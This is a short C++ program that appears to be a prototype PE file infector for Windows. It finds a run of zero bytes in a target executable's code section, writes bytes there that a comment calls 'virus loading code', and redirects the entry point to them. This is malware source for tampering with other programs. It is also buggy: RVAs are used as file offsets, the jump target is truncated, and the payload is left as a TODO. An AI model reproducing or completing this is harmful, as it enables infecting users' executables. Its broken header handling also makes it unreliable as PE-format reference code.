#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <string>

#define RET_INSTRUCTION 0xC3

void analyzeEXE(const char* exePath);

int main()
{
    std::string exePath;
    printf("Enter executable name: ");
    std::getline(std::cin, exePath);
    analyzeEXE(exePath.c_str());
}

void analyzeEXE(const char* exePath)
{
    IMAGE_DOS_HEADER dosHeader;
    FILE* file = fopen(exePath, "r+b");
    if (!file)
    {
        printf("Can't open file :(\n");
        return;
    }
    fread(&dosHeader, sizeof(IMAGE_DOS_HEADER), 1, file);
    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("Invalid magic :(\n");
        return;
    }
    long peHeaderAddr = dosHeader.e_lfanew;
    long optHeaderAddr = peHeaderAddr + 4 + sizeof(IMAGE_FILE_HEADER);
    fseek(file, optHeaderAddr, SEEK_SET);
    IMAGE_OPTIONAL_HEADER optHeader;
    fread(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);

    // read code section and find unused sections
    int size = 0;
    int maxSize = -1;
    int maxSizeStartAddress = 0;
    fseek(file, optHeader.BaseOfCode, SEEK_SET);
    for (int i = 0; i < optHeader.SizeOfCode; i++)
    {
        unsigned char b;
        fread(&b, sizeof(unsigned char), 1, file);
        if (b == 0)
            size++;
        else
        {
            if (size > maxSize)
            {
                maxSize = size;
                maxSizeStartAddress = optHeader.BaseOfCode + i - size + 2;
            }
            size = 0;
        }
    }
    printf("addr: %x, size: %d\n", maxSizeStartAddress, maxSize);

    unsigned char coolCode[] = { 0xF4, 0xE9 };
    // inject virus loading code
    fseek(file, maxSizeStartAddress, SEEK_SET);
    // TODO: read injected code from binary file
    fwrite(coolCode, sizeof(unsigned char), (4 - 2)/*size of injected code*/, file);
    // set jmp address to original entry point
    optHeader.AddressOfEntryPoint -= 4;
    fwrite((unsigned short*)&optHeader.AddressOfEntryPoint, sizeof(unsigned short), 1, file);
    
    // change entry point
    optHeader.AddressOfEntryPoint = maxSizeStartAddress;
    // rewrite updated opt header
    fseek(file, optHeaderAddr, SEEK_SET);
    fwrite(&optHeader, sizeof(IMAGE_OPTIONAL_HEADER), 1, file);

    fclose(file);
}